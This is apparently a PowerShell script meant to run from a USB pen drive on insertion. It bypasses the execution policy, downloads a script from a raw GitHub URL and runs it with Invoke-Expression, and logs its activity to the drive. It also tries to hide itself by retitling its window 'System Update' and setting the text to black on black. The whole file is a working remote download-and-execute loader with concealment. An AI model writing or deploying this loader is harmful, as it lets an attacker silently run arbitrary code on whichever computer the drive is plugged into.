param(
    [string]$ExecutionPath = $PSScriptRoot
)

# Hide PowerShell window immediately
$windowStyle = 'Hidden'

# Set execution policy for this session
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

# Logging function
function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path "$ExecutionPath\autorun.log" -Value "[$timestamp] $Message"
}

# Download and execute remote script function
function Invoke-RemoteScript {
    param([string]$ScriptUrl)
    Write-Log "Downloading and executing remote script from $ScriptUrl"
    try {
        $res = Invoke-WebRequest -Uri $ScriptUrl -UseBasicParsing
        $scriptContent = $res.Content
        iex $scriptContent
        Write-Log "Remote script executed successfully"
    } catch {
        Write-Log "Error executing remote script: $_"
    }
}

# Main execution
Write-Log "Pendrive autorun triggered at $(Get-Date)"

# Specify your remote script URL here
$remoteScriptUrl = "https://raw.githubusercontent.com/Miths-Web/remote-scripts/refs/heads/main/autorun.ps1"

Invoke-RemoteScript -ScriptUrl $remoteScriptUrl

# Hide this script completely
$host.UI.RawUI.WindowTitle = "System Update"
$host.UI.RawUI.BackgroundColor = 'Black'
$host.UI.RawUI.ForegroundColor = 'Black'

